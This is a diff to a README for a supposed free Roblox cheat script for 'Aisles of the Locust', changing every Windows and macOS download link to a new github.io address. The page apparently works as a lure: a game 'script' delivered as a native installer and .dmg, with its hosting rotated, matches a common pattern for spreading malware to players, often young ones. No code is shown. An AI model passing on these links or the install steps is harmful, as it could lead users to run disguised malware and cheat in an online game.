@@ -4,9 +4,9 @@
 
 > 🦗 Aisles of the Locust script with auto survive, swarm dodge, resource farm, and shelter tools. Outlast the locust swarms and survive every harrowing aisle.
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 Whether you're grinding for hours or just getting started, **Aisles of the Locust Script** delivers everything you need to dominate the game. Built for both casual players and dedicated grinders, this free Roblox script gives you the edge to progress faster, earn more, and enjoy the game on your own terms.
 
@@ -16,7 +16,7 @@ Whether you're grinding for hours or just getting started, **Aisles of the Locus
 - Regular updates to stay compatible with the latest game patches
 - Lightweight and optimized for smooth gameplay
 
-### [⬇️ Download Aisles of the Locust Script](https://zenboulderagora.github.io/Windw/)
+### [⬇️ Download Aisles of the Locust Script](https://yobowgileysb.github.io/WinDownload/)
 
 ---
 
@@ -65,7 +65,7 @@ Whether you're grinding for hours or just getting started, **Aisles of the Locus
 
 ### 🖥️ Windows (PC)
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
 1. Click the **Download for Windows** button above
 2. Run the downloaded installer file
@@ -77,7 +77,7 @@ Whether you're grinding for hours or just getting started, **Aisles of the Locus
 
 ### 🍏 macOS (Intel/Apple Silicon)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the **Download for macOS** button above
 2. Open the downloaded `.dmg` and drag to Applications
